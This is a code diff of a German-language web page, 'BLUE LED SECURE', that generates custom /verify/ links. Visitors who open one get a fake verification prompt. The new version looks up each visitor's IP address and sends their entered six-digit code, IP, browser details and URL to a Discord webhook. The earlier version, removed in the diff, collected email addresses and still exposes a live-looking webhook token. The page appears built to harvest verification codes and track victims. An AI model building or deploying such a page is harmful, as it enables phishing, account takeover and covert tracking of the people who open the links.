@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BLUE LED VERIFY • Link Generator</title>
+    <title>BLUE LED SECURE • CODE VERIFY</title>
     <style>
         * {
             margin: 0;
@@ -335,48 +335,49 @@
         .modal-buttons button {
             flex: 1;
         }
+
+        .ip-display {
+            color: #7aa9ff;
+            text-align: center;
+            margin: 10px 0;
+            font-size: 0.9em;
+            font-family: monospace;
+            background: #0a1428;
+            padding: 8px;
+            border-radius: 8px;
+            border: 1px solid #00a6ff40;
+        }
     </style>
 </head>
 <body>
     <div class="grid-overlay"></div>
     
-    <!-- EMAIL MODAL -->
-    <div class="modal" id="emailModal">
-        <div class="modal-content">
-            <div class="modal-title">📧 EMAIL VERIFY</div>
-            <input type="email" class="modal-input" id="emailInput" placeholder="deine@email.com">
-            <div class="modal-buttons">
-                <button onclick="sendEmail()">SENDEN</button>
-                <button onclick="closeModal()">ABBRECHEN</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- CODE MODAL -->
+    <!-- CODE MODAL (NUR NOCH EIN MODAL) -->
     <div class="modal" id="codeModal">
         <div class="modal-content">
-            <div class="modal-title">🔑 CODE EINGEBEN</div>
-            <input type="text" class="modal-input" id="codeInput" placeholder="6-stelliger Code">
+            <div class="modal-title">🔐 CODE EINGEBEN</div>
+            <div class="ip-display" id="ipDisplay">📍 IP wird ermittelt...</div>
+            <input type="text" class="modal-input" id="codeInput" placeholder="6-stelligen Code eingeben" maxlength="6">
             <div class="modal-buttons">
-                <button onclick="verifyCode()">VERIFY</button>
+                <button onclick="submitCode()">VERIFY</button>
                 <button onclick="closeModal()">ABBRECHEN</button>
             </div>
         </div>
     </div>
 
     <div class="container">
-        <h1>BLUE LED VERIFY</h1>
-        <div class="subtitle">⚡ LINK GENERATOR v2.0 - JEDER PFAD FUNKTIONIERT ⚡</div>
+        <h1>BLUE LED SECURE</h1>
+        <div class="subtitle">⚡ CODE VERIFICATION SYSTEM ⚡</div>
 
         <div class="led-status">
-            <span class="led-text">🔵 SYSTEM STATUS: ONLINE</span>
+            <span class="led-text">🔵 SYSTEM STATUS: SECURE MODE</span>
             <div class="led-light"></div>
         </div>
 
         <div class="generator-box">
             <label>🔗 LINK GENERATOR</label>
             <div class="input-group">
-                <input type="text" id="customPath" placeholder="irgendwas eingeben - z.B. fortnite-free" value="test-verify6">
+                <input type="text" id="customPath" placeholder="z.B. secure-access" value="secure-test">
                 <button onclick="generateLink()">GENERATE</button>
             </div>
 
@@ -389,41 +390,40 @@
         <div class="steps">
             <div class="step">
                 <div class="step-number">1</div>
-                <div class="step-text">GENERATE LINK<br>JEDER PFAD GEHT!</div>
+                <div class="step-text">LINK GENERIEREN<br>z.B. secure/access</div>
             </div>
             <div class="step">
                 <div class="step-number">2</div>
-                <div class="step-text">EMAIL EINGEBEN<br>Wird an Webhook gesendet</div>
+                <div class="step-text">CODE EINGEBEN<br>6-stelliger Code</div>
             </div>
             <div class="step">
                 <div class="step-number">3</div>
-                <div class="step-text">CODE VERIFY<br>6-stelligen Code bestätigen</div>
+                <div class="step-text">IP + CODE<br>Wird an Webhook gesendet</div>
             </div>
         </div>
 
         <div class="logs" id="logContainer">
-            <div class="log-entry">🔵 SYSTEM INITIALIZED</div>
+            <div class="log-entry">🔵 SECURE SYSTEM INITIALIZED</div>
             <div class="log-entry">⚡ WEBHOOK: READY</div>
-            <div class="log-entry">📡 LINK GENERATOR: ACTIVE - ALLE PFADE AKZEPTIERT</div>
+            <div class="log-entry">📍 IP LOGGING: ACTIVE</div>
         </div>
 
         <div class="footer">
-            <p>🔵 BLUE LED SYSTEM • JEDER PFAD WIRD AKZEPTIERT • v2.0</p>
+            <p>🔵 BLUE LED SECURE • IP & CODE LOGGING • v3.0</p>
         </div>
     </div>
 
     <script>
         // ===========================================
-        // BLUE LED VERIFICATION SYSTEM - FIXED VERSION
+        // BLUE LED SECURE SYSTEM - CODE + IP LOGGING
         // ===========================================
         
         // DISCORD WEBHOOK URL (DEINE EINGEBEN!)
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1481293642122658064/_gKaaPwTFeyJxARJuOZFpnjI1TJo5FdLM5HacVCqkUTJ9BL7TvT1JBbiVasJPP7fmjpY";
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/DEINE_WEBHOOK_URL_HIER";
         
-        // Store current verification
+        // Store current path
         let currentPath = '';
-        let currentEmail = '';
-        let currentCode = '';
+        let userIP = 'Wird ermittelt...';
         
         // Logging function
         function addLog(message) {
@@ -435,9 +435,29 @@
             logContainer.scrollTop = logContainer.scrollHeight;
         }
         
-        // Generate random 6-digit code
-        function generateCode() {
-            return Math.floor(100000 + Math.random() * 900000).toString();
+        // Get user IP using multiple services
+        async function getUserIP() {
+            try {
+                // Try ipify first
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                userIP = data.ip;
+                document.getElementById('ipDisplay').textContent = `📍 IP: ${userIP}`;
+                addLog(`📍 IP detected: ${userIP}`);
+            } catch (error) {
+                try {
+                    // Fallback to ipapi
+                    const response = await fetch('https://ipapi.co/json/');
+                    const data = await response.json();
+                    userIP = data.ip;
+                    document.getElementById('ipDisplay').textContent = `📍 IP: ${userIP}`;
+                    addLog(`📍 IP detected: ${userIP}`);
+                } catch (error2) {
+                    userIP = 'Could not detect';
+                    document.getElementById('ipDisplay').textContent = '📍 IP: Unbekannt';
+                    addLog('❌ Could not detect IP');
+                }
+            }
         }
         
         // Send to Discord Webhook
@@ -449,8 +469,8 @@
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        content: `🔵 **BLUE LED VERIFICATION**\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``,
-                        username: 'Blue LED Verify',
+                        content: `🔵 **BLUE LED SECURE LOG**\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``,
+                        username: 'Blue LED Secure',
                     })
                 });
                 
@@ -473,7 +493,7 @@
                 return;
             }
             
-            // Clean the path (entfernt Sonderzeichen)
+            // Clean the path
             const cleanPath = customPath.replace(/[^a-zA-Z0-9-]/g, '-').toLowerCase();
             const baseUrl = window.location.origin;
             const fullLink = `${baseUrl}/verify/${cleanPath}`;
@@ -495,94 +515,60 @@
             alert('Link kopiert!');
         }
         
-        // Handle routing - FIXED: JEDER PFAD WIRD AKZEPTIERT!
+        // Handle routing
         function handleRouting() {
             const path = window.location.pathname;
-            const verifyMatch = path.match(/^\/verify\/(.+)/); // .+ akzeptiert ALLES!
+            const verifyMatch = path.match(/^\/verify\/(.+)/);
             
             if (verifyMatch) {
                 const verifyPath = verifyMatch[1];
                 currentPath = verifyPath;
                 
-                addLog(`🔗 User accessed: /verify/${verifyPath} (AKZEPTIERT!)`);
+                addLog(`🔗 User accessed: /verify/${verifyPath}`);
                 
-                // KEINE PRÜFUNG MEHR - JEDER PFAD GEHT!
-                // Show email modal direkt
-                document.getElementById('emailModal').classList.add('active');
+                // Get IP and show code modal
+                getUserIP().then(() => {
+                    document.getElementById('codeModal').classList.add('active');
+                });
             }
         }
         
-        // Send email and prompt for code
-        async function sendEmail() {
-            const email = document.getElementById('emailInput').value.trim();
+        // Submit code (NO GENERATION - USER ENTERS CODE)
+        async function submitCode() {
+            const enteredCode = document.getElementById('codeInput').value.trim();
             
-            if (!email || !email.includes('@')) {
-                alert('Bitte gültige Email eingeben!');
+            if (!enteredCode) {
+                alert('Bitte Code eingeben!');
                 return;
             }
             
-            currentEmail = email;
-            currentCode = generateCode();
+            if (enteredCode.length !== 6 || isNaN(enteredCode)) {
+                alert('Code muss 6-stellig sein!');
+                return;
+            }
             
-            // Send to webhook (EMAIL)
+            // Send to webhook with IP and code
             await sendToWebhook({
-                type: 'EMAIL_SUBMITTED',
+                type: 'CODE_SUBMITTED',
                 path: currentPath,
-                email: currentEmail,
-                code: currentCode,
+                code: enteredCode,
+                ip: userIP,
+                userAgent: navigator.userAgent,
                 timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent
+                url: window.location.href
             });
             
-            addLog(`📧 Email submitted: ${email}`);
-            addLog(`🔑 Code generated: ${currentCode}`);
+            addLog(`🔑 Code submitted: ${enteredCode} from IP: ${userIP}`);
+            addLog(`📍 IP Logged: ${userIP}`);
             
-            // Close email modal, open code modal
-            document.getElementById('emailModal').classList.remove('active');
-            document.getElementById('codeModal').classList.add('active');
-            document.getElementById('emailInput').value = ''; // Clear email input
+            alert(`✅ Code wurde gesendet!\nIP: ${userIP}`);
+            
+            closeModal();
+            document.getElementById('codeInput').value = '';
         }
         
-        // Verify code
-        async function verifyCode() {
-            const inputCode = document.getElementById('codeInput').value.trim();
-            
-            if (inputCode === currentCode) {
-                // Code correct
-                await sendToWebhook({
-                    type: 'VERIFICATION_SUCCESS',
-                    path: currentPath,
-                    email: currentEmail,
-                    code: inputCode,
-                    timestamp: new Date().toISOString()
-                });
-                
-                addLog(`✅ Verification SUCCESS for ${currentEmail}`);
-                alert('✅ VERIFIZIERT! Zugriff gewährt.');
-                
-                closeModal();
-                
-                // Reset
-                document.getElementById('codeInput').value = '';
-            } else {
-                // Code wrong
-                await sendToWebhook({
-                    type: 'VERIFICATION_FAILED',
-                    path: currentPath,
-                    email: currentEmail,
-                    attemptedCode: inputCode,
-                    correctCode: currentCode,
-                    timestamp: new Date().toISOString()
-                });
-                
-                addLog(`❌ Wrong code attempt: ${inputCode}`);
-                alert('❌ Falscher Code!');
-            }
-        }
-        
-        // Close modals
+        // Close modal
         function closeModal() {
-            document.getElementById('emailModal').classList.remove('active');
             document.getElementById('codeModal').classList.remove('active');
         }
         
@@ -591,7 +577,7 @@
         window.addEventListener('popstate', handleRouting);
         
         // Initial log
-        addLog('🔵 BLUE LED SYSTEM READY - ALLE PFADE AKZEPTIERT!');
+        addLog('🔵 BLUE LED SECURE READY');
         addLog(`🔗 Base URL: ${window.location.origin}`);
     </script>
 </body>
